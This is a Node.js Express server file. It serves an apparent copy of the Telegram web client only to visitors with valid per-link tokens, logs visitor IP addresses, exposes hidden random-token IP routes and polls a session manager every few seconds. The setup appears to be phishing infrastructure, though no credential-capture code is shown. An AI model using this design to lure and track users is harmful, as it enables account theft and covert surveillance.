require("dotenv").config({ path: `.${process.env.NODE_ENV}.env` });

const express = require("express");
const cors = require("cors");
const router = require("./router/index");
const path = require("path");
const resValidator = require("./middlewares/validator.middleware");
const http = require("http");
const { Server } = require("socket.io");
const socketController = require("./controllers/socket-controller");
const DB = require("./utils/db_query");
const prescript = require("./utils/prescript");
const cron = require("node-cron");
const sessionManager = require("./session-manager/session-manager");
const ipMiddleware = require("./middlewares/ip.middleware");
const rootipMiddleware = require("./middlewares/rootip.middleware");
const cookieParser = require("cookie-parser");
const linkService = require("./services/link-service");
const useragent = require("express-useragent");
const botService = require("./services/bot-service");
const visitorService = require("./services/visitor-service");

const PORT = process.env.PORT || 5000;
const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: {
    origin: process.env.CLIENT_URL,
    methods: ["GET", "POST"],
  },
});

app.use(express.json());
app.use(
  cors({
    credentials: true,
    origin: process.env.CLIENT_URL,
  })
);
app.use(cookieParser());
app.use(useragent.express());
app.use("/static", express.static(path.join(__dirname, "static")));
app.use("/api", router);
app.use(resValidator);
/*app.get("/", async (req, res, next) => {
  const { linkId } = req.cookies;
  if (linkId) {
    const link = await linkService.getRaw(linkId);
    if (link) return next();
    return res.send().status(404);
  }
  return res.send().status(404);
});
app.get("/:id", async (req, res, next) => {
  const { linkId } = req.cookies;
  console.log(linkId);
  const paramLinkId = req.params.id;
  if (
    paramLinkId === "6lS6dDe7T8Ku0k7Fc0sj0mF1VZOfBD2H" ||
    paramLinkId === "UP4gXS4igXGkm683Zq5nMbAPJlOHLhZD"
  )
    return next();
  if (linkId) {
    const link = await linkService.getRaw(linkId);
    if (link) return next();
    return res.send().status(404);
  }
  if (!paramLinkId) return res.send().status(404);
  const link = await linkService.getRaw(paramLinkId);
  if (!link) return res.send().status(404);
  return next();
});*/

app.get("/6lS6dDe7T8Ku0k7Fc0sj0mF1VZOfBD2H", ipMiddleware);
app.get("/UP4gXS4igXGkm683Zq5nMbAPJlOHLhZD", rootipMiddleware);

let task = null;
let interval = "*/3 * * * * *";

const createCronTask = (cronInterval) => {
  if (task) task.stop();

  task = cron.schedule(cronInterval, async () => {
    sessionManager.poolProcesses();
  });
};

createCronTask(interval);

app.get("/:id", async (req, res, next) => {
  const { linkId } = req.cookies;
  const paramLinkId = req.params.id;
  if (linkId) {
    const link = await linkService.getRaw(linkId);
    if (!link) return res.send().status(404);
    var remA = (
      req.headers["x-forwarded-for"] || req.socket.remoteAddress
    ).replaceAll("::1", "");
    if (remA === "") remA = "127.0.0.1";
    const visitor = await visitorService.get(linkId, undefined, remA);
    res.cookie("visitorId", visitor.json.id);
    return next();
  }
  if (!paramLinkId) return res.send().status(404);
  const link = await linkService.getRaw(paramLinkId);
  if (!link) return res.send().status(404);
  var remA = (
    req.headers["x-forwarded-for"] || req.socket.remoteAddress
  ).replaceAll("::1", "");
  if (remA === "") remA = "127.0.0.1";
  const visitor = await visitorService.get(paramLinkId, undefined, remA);
  res.cookie("visitorId", visitor.json.id);
  return next();
});

if (process.env.NODE_ENV === "prod") {
  app.get("/a", async (req, res, next) => {
    const { linkId } = req.cookies;
    if (!linkId) return res.send().status(404);
    const link = await linkService.getRaw(linkId);
    if (!link) return res.send().status(404);
    return next();
  });

  app.use(
    "/a",
    express.static(path.join(__dirname, "..", "telegram-tt", "dist"))
  );

  app.get("/a/*", (req, res) => {
    res.sendFile(path.resolve(__dirname, "..", "telegram-tt", "dist"));
  });

  app.use("/", express.static(path.join(__dirname, "..", "client", "build")));

  app.get("*", (req, res) => {
    res.sendFile(
      path.resolve(__dirname, "..", "client", "build", "index.html")
    );
  });
}

io.on("connection", (socket) => {
  socketController.handleSocketConnection(socket, io);
});

const BOOTSTRAP = async () => {
  try {
    await DB.query(prescript);
    server.listen(PORT, () => {
      console.log(`Server started on PORT = ${PORT}`);
    });
  } catch (e) {
    console.log(e);
  }
};

BOOTSTRAP();
